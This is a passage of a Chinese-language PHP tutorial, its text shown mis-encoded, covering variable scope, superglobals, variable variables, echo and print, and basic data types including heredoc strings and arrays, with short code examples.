<p>PHP æœ‰å››ç§ä¸åŒçš„å˜é‡ä½œç”¨åŸŸï¼š</p>
<ul>
<li>localï¼šå±€éƒ¨å˜é‡</li>
<li>globalï¼šå…¨å±€å˜é‡</li>
<li>staticï¼šé™æ€å˜é‡</li>
<li>parameterï¼šå‡½æ•°å‚æ•°</li>
</ul>
<h4 id="global"><a href="#global" class="headerlink" title="global"></a>global</h4><p>global å…³é”®å­—ç”¨äº<strong>å‡½æ•°å†…è®¿é—®å…¨å±€å˜é‡</strong>ã€‚è¦åœ¨å‡½æ•°å†…å®šä¹‰globalå˜é‡éœ€è¦å…ˆå†™globalå†å£°æ˜ã€‚å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">5</span>;</span><br><span class="line">$y=<span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $x,$y,$a;</span><br><span class="line">    $y=$x+$y;</span><br><span class="line">    $a=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">myTest();</span><br><span class="line"><span class="keyword">echo</span> $y; <span class="comment">// è¾“å‡º 15</span></span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">// è¾“å‡º 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP å°†æ‰€æœ‰å…¨å±€å˜é‡å­˜å‚¨åœ¨ä¸€ä¸ªåä¸º $GLOBALS[<em>index</em>] çš„æ•°ç»„ä¸­ã€‚ <em>index</em> ä¿å­˜å˜é‡çš„åç§°ã€‚è¿™ä¸ªæ•°ç»„å¯ä»¥åœ¨å‡½æ•°å†…éƒ¨è®¿é—®ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç”¨æ¥æ›´æ–°å…¨å±€å˜é‡ã€‚</p>
<p>ä¸Šé¢çš„å®ä¾‹å¯ä»¥å†™æˆè¿™æ ·ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$x=<span class="number">5</span>;</span><br><span class="line">$y=<span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $GLOBALS[<span class="string">'y'</span>]=$GLOBALS[<span class="string">'x'</span>]+$GLOBALS[<span class="string">'y'</span>];</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">myTest();</span><br><span class="line"><span class="keyword">echo</span> $y;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHPçš„æ‰§è¡Œæ˜¯ä»¥ä¸€ä¸ª.phpè„šæœ¬ä¸ºå•ä½ï¼Œåœ¨ä¸€ä¸ª.phpè„šæœ¬çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥includeå’Œrequireå…¶ä»–PHPè„šæœ¬è¿›æ¥æ‰§è¡Œã€‚æ‰§è¡Œçš„.phpè„šæœ¬ä¸include/requireè¿›æ¥çš„è„šæœ¬å…±äº«ä¸€ä¸ªå…¨å±€åŸŸ(global scope)ã€‚globalå…³é”®å­—æ— è®ºåœ¨å“ªå±‚ï¼Œæ‰€å¼•ç”¨çš„éƒ½æ˜¯å…¨å±€åŸŸçš„å˜é‡ã€‚</p>
<h4 id="Static"><a href="#Static" class="headerlink" title="Static"></a>Static</h4><p>æ¯æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œè¯¥å˜é‡å°†ä¼šä¿ç•™ç€å‡½æ•°å‰ä¸€æ¬¡è¢«è°ƒç”¨æ—¶çš„å€¼ã€‚è¯¥å˜é‡ä»ç„¶æ˜¯å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œä½†ä¸ä¼šåƒæ™®é€šçš„å±€éƒ¨å˜é‡ä¸€æ ·å› ä¸ºå‡½æ•°å®Œæˆè€Œè¢«åˆ é™¤ã€‚</p>
<h4 id="Parameter"><a href="#Parameter" class="headerlink" title="Parameter"></a>Parameter</h4><p>å‚æ•°æ˜¯é€šè¿‡è°ƒç”¨ä»£ç å°†å€¼ä¼ é€’ç»™å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚å‚æ•°æ˜¯åœ¨å‚æ•°åˆ—è¡¨ä¸­å£°æ˜çš„ï¼Œä½œä¸ºå‡½æ•°å£°æ˜çš„ä¸€éƒ¨åˆ†ã€‚å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">($x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $x;</span><br><span class="line">&#125;</span><br><span class="line">myTest(<span class="number">5</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="é¢„å®šä¹‰å˜é‡"><a href="#é¢„å®šä¹‰å˜é‡" class="headerlink" title="é¢„å®šä¹‰å˜é‡"></a>é¢„å®šä¹‰å˜é‡</h3><p>PHP æä¾›äº†å¤§é‡çš„é¢„å®šä¹‰å˜é‡ã€‚ç”±äºè®¸å¤šå˜é‡ä¾èµ–äºè¿è¡Œçš„æœåŠ¡å™¨çš„ç‰ˆæœ¬å’Œè®¾ç½®ï¼ŒåŠå…¶å®ƒå› ç´ ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰è¯¦ç»†çš„è¯´æ˜æ–‡æ¡£ã€‚ä¸€äº›é¢„å®šä¹‰å˜é‡åœ¨ PHP ä»¥<a href="https://www.php.net/manual/zh/features.commandline.php" target="_blank" rel="noopener">å‘½ä»¤è¡Œ</a>å½¢å¼è¿è¡Œæ—¶å¹¶ä¸ç”Ÿæ•ˆã€‚æœ‰å…³è¿™äº›å˜é‡çš„è¯¦ç»†åˆ—è¡¨ï¼Œè¯·å‚é˜…<a href="https://www.php.net/manual/zh/reserved.variables.php" target="_blank" rel="noopener">é¢„å®šä¹‰å˜é‡</a>ä¸€ç« ã€‚</p>
<p>å¦‚æœæœ‰å¯ç”¨çš„ PHP é¢„å®šä¹‰å˜é‡é‚£æœ€å¥½ç”¨ï¼Œå¦‚<a href="https://www.php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="noopener">è¶…å…¨å±€æ•°ç»„</a>ã€‚</p>
<p>è¶…çº§å…¨å±€å˜é‡ä¸èƒ½è¢«ç”¨ä½œå‡½æ•°æˆ–ç±»æ–¹æ³•ä¸­çš„<a href="https://www.php.net/manual/zh/language.variables.variable.php" target="_blank" rel="noopener">å¯å˜å˜é‡</a>ã€‚</p>
<ul>
<li><a href="https://www.php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="noopener">è¶…å…¨å±€å˜é‡</a> â€” è¶…å…¨å±€å˜é‡æ˜¯åœ¨å…¨éƒ¨ä½œç”¨åŸŸä¸­å§‹ç»ˆå¯ç”¨çš„å†…ç½®å˜é‡</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.globals.php" target="_blank" rel="noopener">$GLOBALS</a> â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.server.php" target="_blank" rel="noopener">$_SERVER</a> â€” æœåŠ¡å™¨å’Œæ‰§è¡Œç¯å¢ƒä¿¡æ¯</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.get.php" target="_blank" rel="noopener">$_GET</a> â€” HTTP GET å˜é‡</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.post.php" target="_blank" rel="noopener">$_POST</a> â€” HTTP POST å˜é‡</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.files.php" target="_blank" rel="noopener">$_FILES</a> â€” HTTP æ–‡ä»¶ä¸Šä¼ å˜é‡</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.request.php" target="_blank" rel="noopener">$_REQUEST</a> â€” HTTP Request å˜é‡</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.session.php" target="_blank" rel="noopener">$_SESSION</a> â€” Session å˜é‡</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.environment.php" target="_blank" rel="noopener">$_ENV</a> â€” ç¯å¢ƒå˜é‡</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.cookies.php" target="_blank" rel="noopener">$_COOKIE</a> â€” HTTP Cookies</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.phperrormsg.php" target="_blank" rel="noopener">$php_errormsg</a> â€” å‰ä¸€ä¸ªé”™è¯¯ä¿¡æ¯</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.httprawpostdata.php" target="_blank" rel="noopener">$HTTP_RAW_POST_DATA</a> â€” åŸç”ŸPOSTæ•°æ®</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.httpresponseheader.php" target="_blank" rel="noopener">$http_response_header</a> â€” HTTP å“åº”å¤´</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.argc.php" target="_blank" rel="noopener">$argc</a> â€” ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°æ•°ç›®</li>
<li><a href="https://www.php.net/manual/zh/reserved.variables.argv.php" target="_blank" rel="noopener">$argv</a> â€” ä¼ é€’ç»™è„šæœ¬çš„å‚æ•°æ•°ç»„</li>
</ul>
<h3 id="å¯å˜å˜é‡"><a href="#å¯å˜å˜é‡" class="headerlink" title="å¯å˜å˜é‡"></a>å¯å˜å˜é‡</h3><p>åœ¨ PHP çš„å‡½æ•°å’Œç±»çš„æ–¹æ³•ä¸­ï¼Œ<a href="https://www.php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="noopener">è¶…å…¨å±€å˜é‡</a>ä¸èƒ½ç”¨ä½œå¯å˜å˜é‡ã€‚*$this* å˜é‡ä¹Ÿæ˜¯ä¸€ä¸ªç‰¹æ®Šå˜é‡ï¼Œä¸èƒ½è¢«åŠ¨æ€å¼•ç”¨ã€‚</p>
<p>è¦å°†å¯å˜å˜é‡ç”¨äºæ•°ç»„ï¼Œå¿…é¡»è§£å†³ä¸€ä¸ªæ¨¡æ£±ä¸¤å¯çš„é—®é¢˜ã€‚è¿™å°±æ˜¯å½“å†™ä¸‹ $$a[1] æ—¶ï¼Œè§£æå™¨éœ€è¦çŸ¥é“æ˜¯æƒ³è¦ $a[1] ä½œä¸ºä¸€ä¸ªå˜é‡å‘¢ï¼Œè¿˜æ˜¯æƒ³è¦ $$a ä½œä¸ºä¸€ä¸ªå˜é‡å¹¶å–å‡ºè¯¥å˜é‡ä¸­ç´¢å¼•ä¸º [1] çš„å€¼ã€‚è§£å†³æ­¤é—®é¢˜çš„è¯­æ³•æ˜¯ï¼Œå¯¹ç¬¬ä¸€ç§æƒ…å†µç”¨ ${$a[1]}ï¼Œå¯¹ç¬¬äºŒç§æƒ…å†µç”¨ ${$a}[1]ã€‚</p>
<h3 id="PHPä¹‹å¤–çš„å˜é‡"><a href="#PHPä¹‹å¤–çš„å˜é‡" class="headerlink" title="PHPä¹‹å¤–çš„å˜é‡"></a>PHPä¹‹å¤–çš„å˜é‡</h3><p>é€šå¸¸ï¼ŒPHP ä¸ä¼šæ”¹å˜ä¼ é€’ç»™è„šæœ¬ä¸­çš„å˜é‡åã€‚ç„¶è€Œåº”è¯¥æ³¨æ„åˆ°ç‚¹ï¼ˆå¥å·ï¼‰ä¸æ˜¯ PHP å˜é‡åä¸­çš„åˆæ³•å­—ç¬¦ã€‚è‡³äºåŸå› ï¼Œçœ‹çœ‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$varname.ext;  <span class="comment">/* éæ³•å˜é‡å */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶ï¼Œè§£æå™¨çœ‹åˆ°æ˜¯ä¸€ä¸ªåä¸º $varname çš„å˜é‡ï¼Œåé¢è·Ÿç€ä¸€ä¸ªå­—ç¬¦ä¸²è¿æ¥è¿ç®—ç¬¦ï¼Œåé¢è·Ÿç€ä¸€ä¸ªè£¸å­—ç¬¦ä¸²ï¼ˆå³æ²¡æœ‰åŠ å¼•å·çš„å­—ç¬¦ä¸²ï¼Œä¸”ä¸åŒ¹é…ä»»ä½•å·²çŸ¥çš„å¥åæˆ–ä¿ç•™å­—ï¼‰â€™extâ€™ã€‚å¾ˆæ˜æ˜¾è¿™ä¸æ˜¯æƒ³è¦çš„ç»“æœã€‚</p>
<p>å‡ºäºæ­¤åŸå› ï¼Œè¦æ³¨æ„ PHP å°†ä¼šè‡ªåŠ¨å°†å¤–éƒ¨å˜é‡åä¸­çš„ç‚¹æ›¿æ¢æˆä¸‹åˆ’çº¿ã€‚</p>
<p>å› ä¸º PHP ä¼šåˆ¤æ–­å˜é‡ç±»å‹å¹¶åœ¨éœ€è¦æ—¶è¿›è¡Œè½¬æ¢ï¼ˆé€šå¸¸æƒ…å†µä¸‹ï¼‰ï¼Œå› æ­¤åœ¨æŸä¸€æ—¶åˆ»ç»™å®šçš„å˜é‡æ˜¯ä½•ç§ç±»å‹å¹¶ä¸æ˜æ˜¾ã€‚PHP åŒ…æ‹¬å‡ ä¸ªå‡½æ•°å¯ä»¥åˆ¤æ–­å˜é‡çš„ç±»å‹ï¼Œä¾‹å¦‚ï¼š<a href="https://www.php.net/manual/zh/function.gettype.php" target="_blank" rel="noopener">gettype()</a>ï¼Œ<a href="https://www.php.net/manual/zh/function.is-array.php" target="_blank" rel="noopener">is_array()</a>ï¼Œ<a href="https://www.php.net/manual/zh/function.is-float.php" target="_blank" rel="noopener">is_float()</a>ï¼Œ<a href="https://www.php.net/manual/zh/function.is-int.php" target="_blank" rel="noopener">is_int()</a>ï¼Œ<a href="https://www.php.net/manual/zh/function.is-object.php" target="_blank" rel="noopener">is_object()</a> å’Œ <a href="https://www.php.net/manual/zh/function.is-string.php" target="_blank" rel="noopener">is_string()</a>ã€‚å‚è§<a href="https://www.php.net/manual/zh/language.types.php" target="_blank" rel="noopener">ç±»å‹</a>ä¸€ç« ã€‚</p>
<h2 id="è¾“å‡ºè¯­å¥"><a href="#è¾“å‡ºè¯­å¥" class="headerlink" title="è¾“å‡ºè¯­å¥"></a>è¾“å‡ºè¯­å¥</h2><h3 id="echoå’Œprint"><a href="#echoå’Œprint" class="headerlink" title="echoå’Œprint"></a>echoå’Œprint</h3><ul>
<li>echo - å¯ä»¥è¾“å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²</li>
<li>print - åªå…è®¸è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›å€¼æ€»ä¸º 1</li>
</ul>
<p><strong>æç¤ºï¼š</strong>echo è¾“å‡ºçš„é€Ÿåº¦æ¯” print å¿«ï¼Œ echo æ²¡æœ‰è¿”å›å€¼ï¼Œprintæœ‰è¿”å›å€¼1ã€‚</p>
<h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>ä½¿ç”¨çš„æ—¶å€™å¯ä»¥ä¸ç”¨åŠ æ‹¬å·ï¼Œä¹Ÿå¯ä»¥åŠ ä¸Šæ‹¬å·ï¼š echo æˆ– echo()ã€‚è¾“å‡ºçš„å­—ç¬¦ä¸²å¯ä»¥å¸¦æœ‰htmlæ ‡ç­¾ï¼Œå¤šä¸ªä¸²ç”¨é€—å·éš”å¼€ã€‚</p>
<p>å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt1=<span class="string">"å­¦ä¹  PHP"</span>;</span><br><span class="line">$txt2=<span class="string">"RUNOOB.COM"</span>;</span><br><span class="line">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> $txt1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"åœ¨ $txt2 å­¦ä¹  PHP "</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æˆ‘è½¦çš„å“ç‰Œæ˜¯ &#123;$cars[0]&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><p>å¯ä»¥ä½¿ç”¨æ‹¬å·ï¼Œä¹Ÿå¯ä»¥ä¸ä½¿ç”¨æ‹¬å·ï¼š print æˆ– print()ã€‚ä½¿ç”¨ä¸echoåŸºæœ¬ç›¸åŒã€‚</p>
<h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>æ”¾åœ¨å•å¼•å·åŒå¼•å·ä¸­å‡å¯ã€‚</p>
<p>å•å¼•å·é™¤äº†å•å¼•å·æœ¬èº«å’Œåæ–œçº¿ä»¥å¤–å…¶å®ƒå‡ä¸è½¬ä¹‰ã€‚</p>
<p>å½“å­—ç¬¦ä¸²ç”¨åŒå¼•å·æˆ– heredoc ç»“æ„å®šä¹‰æ—¶ï¼Œå…¶ä¸­çš„<a href="https://www.php.net/manual/zh/language.variables.php" target="_blank" rel="noopener">å˜é‡</a>å°†ä¼šè¢«è§£æã€‚</p>
<p>PHP çš„å­—ç¬¦ä¸²åœ¨å†…éƒ¨æ˜¯å­—èŠ‚ç»„æˆçš„æ•°ç»„ã€‚å› æ­¤ç”¨èŠ±æ‹¬å·è®¿é—®æˆ–ä¿®æ”¹å­—ç¬¦ä¸²å¯¹å¤šå­—èŠ‚å­—ç¬¦é›†å¾ˆä¸å®‰å…¨ã€‚</p>
<h4 id="heredoc"><a href="#heredoc" class="headerlink" title="heredoc"></a>heredoc</h4><p><em>&lt;&lt;&lt;xxx</em>ã€‚</p>
<p>è¦æ³¨æ„çš„æ˜¯ç»“æŸæ ‡è¯†ç¬¦è¿™è¡Œé™¤äº†<em>å¯èƒ½</em>æœ‰ä¸€ä¸ªåˆ†å·ï¼ˆ*;<em>ï¼‰å¤–ï¼Œç»å¯¹ä¸èƒ½åŒ…å«å…¶å®ƒå­—ç¬¦ã€‚è¿™æ„å‘³ç€æ ‡è¯†ç¬¦</em>ä¸èƒ½ç¼©è¿›*ï¼Œåˆ†å·çš„å‰åä¹Ÿä¸èƒ½æœ‰ä»»ä½•ç©ºç™½æˆ–åˆ¶è¡¨ç¬¦ã€‚æ›´é‡è¦çš„æ˜¯ç»“æŸæ ‡è¯†ç¬¦çš„å‰é¢å¿…é¡»æ˜¯ä¸ªè¢«æœ¬åœ°æ“ä½œç³»ç»Ÿè®¤å¯çš„æ¢è¡Œï¼Œæ¯”å¦‚åœ¨ UNIX å’Œ Mac OS X ç³»ç»Ÿä¸­æ˜¯ <em>\n</em>ï¼Œè€Œç»“æŸå®šç•Œç¬¦ï¼ˆå¯èƒ½å…¶åæœ‰ä¸ªåˆ†å·ï¼‰ä¹‹åä¹Ÿå¿…é¡»ç´§è·Ÿä¸€ä¸ªæ¢è¡Œã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $bar = <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">bar</span></span><br><span class="line">    EOT;  <span class="comment">//éæ³•ï¼ï¼ï¼</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="nowdoc"><a href="#nowdoc" class="headerlink" title="nowdoc"></a>nowdoc</h4><p>*&lt;&lt;&lt;â€™xxxâ€™*ã€‚</p>
<p>ä¸heredocç»“æ„ç›¸ä¼¼ï¼Œä½†ä¸å¯¹ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ã€‚ï¼ˆ&gt;php5.3.0ï¼‰</p>
<h4 id="å˜é‡è§£æ"><a href="#å˜é‡è§£æ" class="headerlink" title="å˜é‡è§£æ"></a>å˜é‡è§£æ</h4><ul>
<li><p>ç®€å•è¯­æ³•</p>
<p>é‡ <code>$</code> å°è¯•è§£æã€‚</p>
</li>
<li><p>å¤æ‚è¯­æ³•</p>
<p>èŠ±æ‹¬å·æ‹¬èµ·ã€‚é‡Œé¢å¯ä»¥å†™å¤æ‚çš„è¡¨è¾¾å¼ã€‚åªæœ‰ <em>$</em> ç´§æŒ¨ç€ <em>{</em> æ—¶æ‰ä¼šè¢«è¯†åˆ«ã€‚</p>
</li>
</ul>
<h4 id="å­˜å–å’Œä¿®æ”¹å­—ç¬¦"><a href="#å­˜å–å’Œä¿®æ”¹å­—ç¬¦" class="headerlink" title="å­˜å–å’Œä¿®æ”¹å­—ç¬¦"></a>å­˜å–å’Œä¿®æ”¹å­—ç¬¦</h4><p>ç”¨æ–¹æ‹¬å·æˆ–èŠ±æ‹¬å·è®¿é—®ã€‚</p>
<h3 id="Int"><a href="#Int" class="headerlink" title="Int"></a>Int</h3><p>ä¸èƒ½åŒ…å«é€—å·å’Œç©ºæ ¼ï¼Œæ— å°æ•°ç‚¹ï¼Œå¯æ­£å¯è´Ÿï¼Œå¯ä»¥æ˜¯åè¿›åˆ¶ï¼Œ åå…­è¿›åˆ¶ï¼ˆ ä»¥ 0x ä¸ºå‰ç¼€ï¼‰æˆ–å…«è¿›åˆ¶ï¼ˆå‰ç¼€ä¸º 0ï¼‰ã€‚</p>
<h3 id="Float"><a href="#Float" class="headerlink" title="Float"></a>Float</h3><p>å¸¦å°æ•°çš„æˆ–æ˜¯æŒ‡æ•°å½¢å¼çš„ã€‚ä¾‹å¦‚ï¼š 1.2ï¼Œ2.4e3ï¼Œ8E-5ã€‚</p>
<h3 id="Bool"><a href="#Bool" class="headerlink" title="Bool"></a>Bool</h3><p>trueæˆ–falseã€‚</p>
<h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><p>æœ‰åºæ˜ å°„ã€‚æ˜ å°„æ˜¯ä¸€ç§æŠŠ <em>values</em> å…³è”åˆ° <em>keys</em> çš„ç±»å‹ã€‚ç”±äºæ•°ç»„å…ƒç´ çš„å€¼ä¹Ÿå¯ä»¥æ˜¯å¦ä¸€ä¸ªæ•°ç»„ï¼Œæ ‘å½¢ç»“æ„å’Œå¤šç»´æ•°ç»„ä¹Ÿæ˜¯å…è®¸çš„ã€‚</p>
<h4 id="å®šä¹‰æ•°ç»„"><a href="#å®šä¹‰æ•°ç»„" class="headerlink" title="å®šä¹‰æ•°ç»„"></a>å®šä¹‰æ•°ç»„</h4><p>å¯ä»¥ç”¨ <a href="https://www.php.net/manual/zh/function.array.php" target="_blank" rel="noopener">array()</a> è¯­è¨€ç»“æ„æ¥æ–°å»ºä¸€ä¸ªæ•°ç»„ã€‚å®ƒæ¥å—ä»»æ„æ•°é‡ç”¨é€—å·åˆ†éš”çš„ <em>é”®ï¼ˆkeyï¼‰ =&gt; å€¼ï¼ˆvalueï¼‰</em>å¯¹ã€‚</p>
<p>è‡ª 5.4 èµ·å¯ä»¥ä½¿ç”¨çŸ­æ•°ç»„å®šä¹‰è¯­æ³•ï¼Œç”¨ <em>[]</em> æ›¿ä»£ *array()*ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"foo"</span> =&gt; <span class="string">"bar"</span>,</span><br><span class="line">    <span class="string">"bar"</span> =&gt; <span class="string">"foo"</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è‡ª PHP 5.4 èµ·</span></span><br><span class="line">$array = [</span><br><span class="line">    <span class="string">"foo"</span> =&gt; <span class="string">"bar"</span>,</span><br><span class="line">    <span class="string">"bar"</span> =&gt; <span class="string">"foo"</span>,</span><br><span class="line">];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>key å¯ä»¥æ˜¯ <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> æˆ–è€… <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>ã€‚value å¯ä»¥æ˜¯ä»»æ„ç±»å‹ã€‚</p>
<ul>
<li>åŒ…å«æœ‰åˆæ³•æ•´å‹å€¼çš„å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢ä¸ºæ•´å‹ã€‚ä¾‹å¦‚é”®å <em>â€œ8â€</em> å®é™…ä¼šè¢«å‚¨å­˜ä¸º <em>8</em>ã€‚ä½†æ˜¯ <em>â€œ08â€</em> åˆ™ä¸ä¼šå¼ºåˆ¶è½¬æ¢ï¼Œå› ä¸ºå…¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„åè¿›åˆ¶æ•°å€¼ã€‚</li>
<li>æµ®ç‚¹æ•°ä¹Ÿä¼šè¢«è½¬æ¢ä¸ºæ•´å‹ï¼Œæ„å‘³ç€å…¶å°æ•°éƒ¨åˆ†ä¼šè¢«èˆå»ã€‚ä¾‹å¦‚é”®å <em>8.7</em> å®é™…ä¼šè¢«å‚¨å­˜ä¸º <em>8</em>ã€‚</li>
<li>å¸ƒå°”å€¼ä¹Ÿä¼šè¢«è½¬æ¢æˆæ•´å‹ã€‚å³é”®å <em>true</em> å®é™…ä¼šè¢«å‚¨å­˜ä¸º <em>1</em> è€Œé”®å <em>false</em> ä¼šè¢«å‚¨å­˜ä¸º <em>0</em>ã€‚</li>
<li><a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">Null</a> ä¼šè¢«è½¬æ¢ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå³é”®å <em>null</em> å®é™…ä¼šè¢«å‚¨å­˜ä¸º *â€â€*ã€‚</li>
<li>æ•°ç»„å’Œå¯¹è±¡<em>ä¸èƒ½</em>è¢«ç”¨ä¸ºé”®åã€‚åšæŒè¿™ä¹ˆåšä¼šå¯¼è‡´è­¦å‘Šï¼š<em>Illegal offset type</em>ã€‚</li>
</ul>
<p><strong>å¦‚æœåœ¨æ•°ç»„å®šä¹‰ä¸­å¤šä¸ªå•å…ƒéƒ½ä½¿ç”¨äº†åŒä¸€ä¸ªé”®åï¼Œåˆ™åªä½¿ç”¨äº†æœ€åä¸€ä¸ªï¼Œä¹‹å‰çš„éƒ½è¢«è¦†ç›–äº†ã€‚</strong></p>
<p>PHP æ•°ç»„å¯ä»¥åŒæ—¶å«æœ‰ <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> å’Œ <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a> ç±»å‹çš„é”®åï¼Œå› ä¸º PHP å®é™…å¹¶ä¸åŒºåˆ†ç´¢å¼•æ•°ç»„å’Œå…³è”æ•°ç»„ã€‚</p>
<p>å¦‚æœæœªæŒ‡å®škeyï¼ŒPHP å°†è‡ªåŠ¨ä½¿ç”¨ä¹‹å‰ç”¨è¿‡çš„æœ€å¤§ <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> é”®ååŠ ä¸Š 1 ä½œä¸ºæ–°çš„é”®åï¼Œä¹‹å‰æ²¡ç”¨è¿‡integeré”®åçš„å–keyå€¼ä¸º0ï¼ˆæ³¨æ„è¿™é‡Œæ‰€ä½¿ç”¨çš„æœ€å¤§æ•´æ•°é”®å<em>ä¸ä¸€å®š</em>å½“å‰å°±åœ¨æ•°ç»„ä¸­ã€‚å®ƒåªè¦åœ¨ä¸Šæ¬¡æ•°ç»„é‡æ–°ç”Ÿæˆç´¢å¼•åæ›¾ç»å­˜åœ¨è¿‡å°±è¡Œäº†ã€‚ï¼‰ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"foo"</span> =&gt; <span class="string">"bar"</span>,</span><br><span class="line">    <span class="string">"bar"</span> =&gt; <span class="string">"foo"</span>,</span><br><span class="line">    <span class="number">100</span>   =&gt; <span class="number">-100</span>,</span><br><span class="line">    <span class="number">-100</span>  =&gt; <span class="number">100</span>,</span><br><span class="line">);</span><br><span class="line">$array[] = <span class="string">"a"</span>;</span><br><span class="line">var_dump($array);</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(5) &#123;</span></span><br><span class="line"><span class="comment">  ["foo"]=&gt;</span></span><br><span class="line"><span class="comment">  string(3) "bar"</span></span><br><span class="line"><span class="comment">  ["bar"]=&gt;</span></span><br><span class="line"><span class="comment">  string(3) "foo"</span></span><br><span class="line"><span class="comment">  [100]=&gt;</span></span><br><span class="line"><span class="comment">  int(-100)</span></span><br><span class="line"><span class="comment">  [-100]=&gt;</span></span><br><span class="line"><span class="comment">  int(100)</span></span><br><span class="line"><span class="comment">  [101]=&gt;</span></span><br><span class="line"><span 